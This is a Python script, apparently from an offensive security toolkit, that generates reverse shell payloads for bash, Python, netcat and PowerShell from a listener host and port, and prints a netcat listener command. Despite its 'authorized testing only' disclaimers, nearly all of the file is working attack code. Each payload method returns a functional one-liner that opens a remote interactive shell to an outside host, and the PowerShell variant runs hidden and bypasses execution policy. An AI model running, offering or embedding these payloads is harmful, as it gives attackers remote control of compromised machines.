#!/usr/bin/env python3
"""
Reverse Shell Generator - Template

Generates reverse shell payloads for various platforms (educational purposes only).

[!] CRITICAL: For authorized penetration testing only. Misuse is illegal.

Usage:
    python reverse_shell.py --lhost <ip> --lport <port> --type <shell_type>

Example:
    python reverse_shell.py --lhost 192.168.1.100 --lport 4444 --type bash

Author: David Dashti
Date: 2025-10-15
MITRE ATT&CK: T1059 (Command and Scripting Interpreter)
"""

import argparse
import sys

from offensive_toolkit.utils.logger import get_logger

logger = get_logger(__name__)


class ReverseShellGenerator:
    """
    Reverse shell payload generator.

    [!] EDUCATIONAL TEMPLATE - For authorized testing only.
    """

    def __init__(self):
        """Initialize the generator."""
        self.payloads = {
            "bash": self._bash_shell,
            "python": self._python_shell,
            "nc": self._netcat_shell,
            "powershell": self._powershell_shell,
        }
        logger.info("Initialized ReverseShellGenerator")

    def generate(self, lhost: str, lport: int, shell_type: str) -> str | None:
        """
        Generate reverse shell payload.

        Args:
            lhost: Listener host IP
            lport: Listener port
            shell_type: Type of shell (bash, python, nc, powershell)

        Returns:
            Payload string or None if invalid type
        """
        generator = self.payloads.get(shell_type)
        if not generator:
            logger.error(f"Unknown shell type: {shell_type}")
            return None

        payload = generator(lhost, lport)
        logger.info(f"Generated {shell_type} reverse shell payload")
        return payload

    def _bash_shell(self, lhost: str, lport: int) -> str:
        """Generate bash reverse shell."""
        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

    def _python_shell(self, lhost: str, lport: int) -> str:
        """Generate Python reverse shell."""
        return (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f's.connect(("{lhost}",{lport}));'
            f"os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f'subprocess.call(["/bin/bash","-i"])\''
        )

    def _netcat_shell(self, lhost: str, lport: int) -> str:
        """Generate netcat reverse shell."""
        return f"nc -e /bin/bash {lhost} {lport}"

    def _powershell_shell(self, lhost: str, lport: int) -> str:
        """Generate PowerShell reverse shell."""
        return (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass "
            f"-Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
            f"{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
            f'$client.Close()"'
        )


def main() -> int:
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="Reverse Shell Generator\n[!] For authorized testing only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--lhost", required=True, help="Listener host IP")
    parser.add_argument("--lport", required=True, type=int, help="Listener port")
    parser.add_argument(
        "--type", required=True, choices=["bash", "python", "nc", "powershell"], help="Shell type"
    )

    args = parser.parse_args()

    print("\n" + "=" * 70)
    print("[!] Reverse Shell Generator - For Authorized Testing Only")
    print("[!] Unauthorized use is illegal")
    print("=" * 70 + "\n")

    generator = ReverseShellGenerator()
    payload = generator.generate(args.lhost, args.lport, args.type)

    if payload:
        print(f"[+] {args.type.upper()} Reverse Shell Payload:")
        print(f"\n{payload}\n")
        print(f"[*] Set up listener with: nc -lvnp {args.lport}")
        return 0
    print("[-] Failed to generate payload")
    return 1


if __name__ == "__main__":
    sys.exit(main())
